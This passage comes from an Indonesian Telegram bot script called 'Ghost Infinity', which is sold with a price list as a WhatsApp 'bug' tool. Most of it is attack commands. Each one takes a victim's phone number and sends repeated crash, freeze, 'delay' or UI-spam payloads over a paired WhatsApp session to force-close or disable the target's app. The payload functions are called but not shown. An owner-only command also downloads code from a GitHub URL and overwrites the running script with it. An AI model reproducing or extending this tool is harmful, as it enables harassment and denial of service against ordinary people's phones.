        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

// VERSI MODIFIKASI UNTUK DELPREM (dengan reply juga)
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

//---------(MIDDLEWARE PERIZINAN GROUP ) ---------//
bot.use(async (ctx, next) => {
  if (!ctx.chat) return next();

  const isGroup = ctx.chat.type === "group" || ctx.chat.type === "supergroup";
  if (!isGroup) return next();

  const chatId = String(ctx.chat.id);

  // command khusus approval tetap boleh
  const text = ctx.message?.text || "";
  const cmd = text.startsWith("/") ? text.split(" ")[0].toLowerCase() : "";

  const bypass = ["/approved", "/unapproved", "/listapprovedgroup"];

  if (!isGroupApproved(chatId) && !bypass.includes(cmd)) {
    if (ctx.message?.text?.startsWith("/")) {
      await ctx.reply("❌ Group ini belum di-approved oleh owner untuk melanjutkan silahkan 🪧 Format: /approved -100xxxxxxxxxx");
    }
    return;
  }

  return next();
});
//---------(MIDDLEWARE JOIN CH ) ---------//
async function checkJoin(ctx) {
  try {
    const member = await ctx.telegram.getChatMember(`@${CHANNEL_USERNAME}`, ctx.from.id);
    return ["member", "administrator", "creator"].includes(member.status);
  } catch (err) {
    console.log("CHECK JOIN ERROR:", err.message);
    return false;
  }
}

bot.use(async (ctx, next) => {
  try {
    if (!ctx.from) return next();

    const text = ctx.message?.text;
    if (!text) return next();

    // cuma cek kalau message command
    if (!text.startsWith("/")) return next();

    const joined = await checkJoin(ctx);

    if (!joined) {
      return ctx.reply(
        "❌ Kamu wajib join channel dulu sebelum menggunakan bot ini.",
        {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "📢 JOIN CHANNEL",
                  url: `https://t.me/${CHANNEL_USERNAME}`
                }
              ]
            ]
          }
        }
      );
    }

    return next();
  } catch (e) {
    console.log("MIDDLEWARE JOIN ERROR:", e.message);
    return ctx.reply("❌ Terjadi error saat cek akses channel.");
  }
});

//---------(MIDDLEWARE BLOCK CMD ) ---------//
bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) {
    return next();
  }

  const text = ctx.message.text.trim();
  if (!text.startsWith("/")) {
    return next();
  }

  const command = normalizeCommandName(text.split(" ")[0].split("@")[0]);

  // command manajemen block jangan ikut diblok oleh middleware ini
  const bypassCommands = ["blockcmd", "unblockcmd", "listblockcmd"];

  if (!bypassCommands.includes(command) && isCommandBlocked(command)) {
    await ctx.reply(`❌ Command /${command} sedang diblokir.`);
    return;
  }

  return next();
});

//------------------(WAJIB DI ISI YAA)--------------------//
const thumbnailUrl = "https://files.catbox.moe/r622rz.jpg";
const ThumbnailPairing = "https://files.catbox.moe/czz0fp.jpg";

// ------ ( Menu Utama + Button Disko ) ------ //
const styles = ["Primary", "Success", "Danger"];
let styleIndex = 0;
let menuAnimation = null;

function getAnimatedMainKeyboard() {
    const style = styles[styleIndex];

    styleIndex++;
    if (styleIndex >= styles.length) styleIndex = 0;

    return [
        [
            { text: "⸙ MURBUG", callback_data: "/murbug_menu", style },
            { text: "⸙ ATTACK", callback_data: "/bug_menu", style }
        ],
        [
             { text: "⸙ SETTINGS", callback_data: "/owner_menu", style },
        ],
        [
            { text: "⸙ OWNERS", url: "https://t.me/Xerozzz_Reals", style }
        ]
    ];
}

function stopMenuAnimation() {
    if (menuAnimation) {
        clearInterval(menuAnimation);
        menuAnimation = null;
    }
}

// ------ ( Menu Utama ) ------ //
bot.start(async (ctx) => {
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const menuMessage = `\`\`\`js
⸙ 𝗚𝗛𝗢𝗦𝗧 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 𝗦𝗖𝗥𝗔𝗣𝗘 

"一緒 INFORMATION BOT ᯤ"
────────────────────────
✗ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : @Xerozzz_Reals
✗ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0 
✗ 𝗧𝘆𝗽𝗲 : ( Telegraf )
✗ 𝗦𝘁𝗮𝘁𝘂𝘀 𝗦𝗲𝗿𝘃𝗲𝗿 : Active
✗ 𝗥𝘂𝗻𝗧𝗶𝗺𝗲 : ${runtimeStatus}

"一緒 HARGA SCRIPT BUG ᯤ"
────────────────────────
✗ 𝗙𝘂𝗹𝗹 𝗨𝗽𝗱𝗮𝘁𝗲 : 15.000
✗ 𝗥𝗲𝘀𝘀𝗲𝗹𝗲𝗿 : 25.000
✗ 𝗣𝗮𝗿𝘁𝗻𝗲𝗿 : 35.000

────────────────────────
𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲 𝗦𝘁𝗮𝘁𝘂𝘀 : ACTIVE
𝗘𝗻𝗰𝗿𝘆𝗽𝘁 𝗙𝗶𝗹𝗲𝘀 : ACTIVE
𝗣𝗿𝗼𝘁𝗲𝗰𝘁𝗲𝗱 𝗙𝗶𝗹𝗲𝘀 : ACTIVE
\`\`\``;

    try {
        stopMenuAnimation();

        const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {
            caption: menuMessage,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: getAnimatedMainKeyboard()
            }
        });

        menuAnimation = setInterval(async () => {
            try {
                await ctx.telegram.editMessageReplyMarkup(
                    ctx.chat.id,
                    sentMsg.message_id,
                    undefined,
                    {
                        inline_keyboard: getAnimatedMainKeyboard()
                    }
                );
            } catch (e) {}
        }, 2500);
    } catch (error) {
        console.error("Error saat mengirim menu utama:", error);
    }
});

// ------ ( Callback Menu Utama ) ------ //
bot.action("/start", async (ctx) => {
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const menuMessage = `\`\`\`js
⸙ 𝗚𝗛𝗢𝗦𝗧 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 𝗦𝗖𝗥𝗔𝗣𝗘 

"一緒 INFORMATION BOT ᯤ"
────────────────────────
✗ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : @Xerozzz_Reals
✗ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0 
✗ 𝗧𝘆𝗽𝗲 : ( Telegraf )
✗ 𝗦𝘁𝗮𝘁𝘂𝘀 𝗦𝗲𝗿𝘃𝗲𝗿 : Active
✗ 𝗥𝘂𝗻𝗧𝗶𝗺𝗲 : ${runtimeStatus}

"一緒 HARGA SCRIPT BUG ᯤ"
────────────────────────
✗ 𝗙𝘂𝗹𝗹 𝗨𝗽𝗱𝗮𝘁𝗲 : 15.000
✗ 𝗥𝗲𝘀𝘀𝗲𝗹𝗲𝗿 : 25.000
✗ 𝗣𝗮𝗿𝘁𝗻𝗲𝗿 : 35.000

────────────────────────
𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲 𝗦𝘁𝗮𝘁𝘂𝘀 : ACTIVE
𝗘𝗻𝗰𝗿𝘆𝗽𝘁 𝗙𝗶𝗹𝗲𝘀 : ACTIVE
𝗣𝗿𝗼𝘁𝗲𝗰𝘁𝗲𝗱 𝗙𝗶𝗹𝗲𝘀 : ACTIVE
\`\`\``;

    try {
        stopMenuAnimation();

        await ctx.editMessageMedia(
            {
                type: "photo",
                media: thumbnailUrl,
                caption: menuMessage,
                parse_mode: "Markdown"
            },
            {
                reply_markup: {
                    inline_keyboard: getAnimatedMainKeyboard()
                }
            }
        );

        const messageId = ctx.callbackQuery.message.message_id;

        menuAnimation = setInterval(async () => {
            try {
                await ctx.telegram.editMessageReplyMarkup(
                    ctx.chat.id,
                    messageId,
                    undefined,
                    {
                        inline_keyboard: getAnimatedMainKeyboard()
                    }
                );
            } catch (e) {}
        }, 2500);

        await ctx.answerCbQuery();
    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Bot Action Owner Menu ) ------ //
bot.action('/owner_menu', async (ctx) => {
    stopMenuAnimation(); 
    const owner_menuMenu = `\`\`\`js
⸙ 𝗚𝗛𝗢𝗦𝗧 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 𝗦𝗖𝗥𝗔𝗣𝗘 

"一緒 OWNER INFORMATION ᯤ"
────────────────────────
✗ /addprem - Add Premium 
✗ /delprem - Del Premium 
✗ /addpairing - Add Pairing Bot
✗ /killsession - Hapus Sessions
✗ /setcd - Setting Jeda Bug
✗ /approved - Izinkan Group 
✗ /unapproved - Hapus Izin Group 
✗ /listapprovedgroup - List Perizinan
✗ /blockcmd - Block Command
✗ /unblockcmd - Unblock Command
✗ /listblockcmd - List Block Command
✗ /addpremgrup - Premium Group 
✗ /delpremgrup - Del Premium Group 
✗ /listpremgrup - List Premium Group 

"一緒 HARGA SCRIPT BUG ᯤ"
────────────────────────
✗ 𝗙𝘂𝗹𝗹 𝗨𝗽𝗱𝗮𝘁𝗲 : 15.000
✗ 𝗥𝗲𝘀𝘀𝗲𝗹𝗲𝗿 : 25.000
✗ 𝗣𝗮𝗿𝘁𝗻𝗲𝗿 : 35.000

────────────────────────
\`\`\``;

    const keyboard = [
        [
            { text: "⸙ Back Menu", callback_data: "/start", style: "Success" },
        ]
    ];

    try {
        await ctx.editMessageCaption(owner_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di owner_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Bot Action Bug Menu ) ------ //
bot.action('/bug_menu', async (ctx) => {
    stopMenuAnimation(); 
    const bug_menuMenu = `\`\`\`js
⸙ 𝗚𝗛𝗢𝗦𝗧 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 𝗦𝗖𝗥𝗔𝗣𝗘 

"一緒 BUG INFORMATION ᯤ"
────────────────────────
✗ /GhostDelay - Delay invisible New 
✗ /Flowers - Delay for internet 
✗ /Frezee - Freeze Blank Visible 
✗ /SpamUI - Spam UI Android 
✗ /Blank - Blank Visible 5 Message 
✗ /XPerma - Delay With Permanent 
✗ /CrashStc - Force Close Stickers 

"一緒 HARGA SCRIPT BUG ᯤ"
────────────────────────
✗ 𝗙𝘂𝗹𝗹 𝗨𝗽𝗱𝗮𝘁𝗲 : 15.000
✗ 𝗥𝗲𝘀𝘀𝗲𝗹𝗲𝗿 : 25.000
✗ 𝗣𝗮𝗿𝘁𝗻𝗲𝗿 : 35.000

────────────────────────
\`\`\``;

    const keyboard = [
        [
            { text: "⸙ Back Menu", callback_data: "/start", style: "Success" },
        ]
    ];

    try {
        await ctx.editMessageCaption(bug_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Bot Action Murbug Menu ) ------ //
bot.action('/murbug_menu', async (ctx) => {
    stopMenuAnimation(); 
    const murbug_menuMenu = `\`\`\`js
⸙ 𝗚𝗛𝗢𝗦𝗧 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 𝗦𝗖𝗥𝗔𝗣𝗘 

"一緒 MURBUG INFORMATION ᯤ"
────────────────────────
✗ /Montex - Delay New invisible 
✗ /Vortex - Delay Invisible Low
✗ /Clown - Delay Invisible hard
✗ /Deadly - Delay Invisible Medium
✗ /XBugs - Delay Invisible Magic 
✗ /Little - Delay Invisible Super 

"一緒 STATUS INFORMATION ᯤ"
────────────────────────
✗ 𝗥𝗲𝗽𝗮𝗶𝗿 𝗦𝘆𝘀𝘁𝗲𝗺 : Berhasil 
✗ 𝗥𝗲𝗽𝗮𝗶𝗿 𝗦𝗲𝘀𝘀𝗶𝗼𝗻𝘀 : Berhasil 
✗ 𝗥𝗲𝗽𝗮𝗶𝗿 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻 : Berhasil 

────────────────────────
\`\`\``;

    const keyboard = [
        [
            { text: "⸙ Back Menu", callback_data: "/start", style: "Success" },
        ]
    ];

    try {
        await ctx.editMessageCaption(murbug_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di murbug_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

//------------------(AUTO - UPDATE SYSTEM)--------------------//
bot.command("update", async (ctx) => doUpdate(ctx));

// ✅ UPDATE URL DISINI AJA (GAK DIPISAH)
const UPDATE_URL =
  "https://raw.githubusercontent.com/agungdermawan22332-sys/Astra-Void-Update/main/Destoryed.js"; // GANTI RAW URL

// ✅ foto /start
const thumbnailUp = "https://files.catbox.moe/j8ci57.jpg"; // GANTI (boleh file_id juga)

// ✅ file yang mau ditimpa update (samain sama file yang dijalanin panel)
const UPDATE_FILE_PATH = "./Destoryed.js"; // GANTI kalau panel jalanin file lain

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https
      .get(url, (res) => {
        if (res.statusCode !== 200) {
          file.close(() => fs.unlink(filePath, () => {}));
          return reject(new Error(`HTTP_${res.statusCode}`));
        }

        res.pipe(file);

        file.on("finish", () => file.close(resolve));
      })
      .on("error", (err) => {
        file.close(() => fs.unlink(filePath, () => {}));
        reject(err);
      });
  });
}

async function doUpdate(ctx) {
  if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  await ctx.reply("⏳ <b>Auto Update Script...</b>\nMohon tunggu.", {
    parse_mode: "HTML",
  });

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    await ctx.reply("✅ <b>Update berhasil!</b>\n♻ <i>Restarting bot...</i>", {
      parse_mode: "HTML",
    });

    setTimeout(() => process.exit(0), 1500);
  } catch (e) {
    await ctx.reply(
      `❌ <b>Gagal update.</b>\nReason: <code>${String(e.message || e)}</code>`,
      { parse_mode: "HTML" }
    );
  }
}

//------------------(CASE NO SPAM)--------------------//
bot.command("CrashStc", checkWhatsAppConnection, premGroupOnly(), checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /CrashStc 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Force Close Stickers 
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 40; i++) {
    await delSticker(sock, target);
    await sleep(2200);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Force Close Stickers 
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("XPerma", checkWhatsAppConnection, premGroupOnly(), checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XPerma 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay With Permanent 
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await TrdxtCount(24, target); 
    await sleep(2100);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay With Permanent 
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Blank", checkWhatsAppConnection, premGroupOnly(), checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Blank 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank 5 Message
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await NoobUi(sock, target);
    await sleep(2500);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank 5 Message
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("SpamUI", checkWhatsAppConnection, premGroupOnly(), checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /SpamUI 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Spam UI Android
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 30; i++) {
    await xvar(sock, target);
    await sleep(2200);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Spam UI Android
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Frezee", checkWhatsAppConnection, premGroupOnly(), checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Frezee 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Freeze Blank Visible 
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 40; i++) {
    await NeoVedray(sock, target);
    await sleep(2200);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Freeze Blank Visible 
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Flowers", checkWhatsAppConnection, premGroupOnly(), checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Flowers 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay for internet 
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 30; i++) {
    await jirDelayHardWak(target);
    await sleep(2000);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay for internet 
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("GhostDelay", checkWhatsAppConnection, premGroupOnly(), checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /GhostDelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay invisible New
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await DelayNew(sock, target);
    await sleep(1000);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Delay invisible New
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});


//------------------(CASE BEBAS SPAM)--------------------//
bot.command("Little", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /Little 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay Invisible Super 
𝙎𝙩𝙖𝙩𝙪𝙨 : Sedang Mengirim...
\`\`\``,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await RunningJobs(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay Invisible Super 
𝙎𝙩𝙖𝙩𝙪𝙨 : Payload Terkirim 
\`\`\``,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay Invisible Super 
𝙎𝙩𝙖𝙩𝙪𝙨 : Payload Gagal
\`\`\``,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("XBugs", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /XBugs 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay Invisible Magic 
𝙎𝙩𝙖𝙩𝙪𝙨 : Sedang Mengirim...
\`\`\``,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await RunningJobs(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay Invisible Magic 
𝙎𝙩𝙖𝙩𝙪𝙨 : Payload Terkirim 
\`\`\``,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id, `\`\`\`js
"一緒 Attachment Bug ᯤ"
───────────────────
𝙏𝙖𝙧𝙜𝙚𝙩 : ${rawNumber}
𝙈𝙤𝙙𝙚 : Delay Invisible Magic 
𝙎𝙩𝙖𝙩𝙪𝙨 : Payload Gagal
\`\`\``,
        {
          parse_mode: "Markdown"
        }
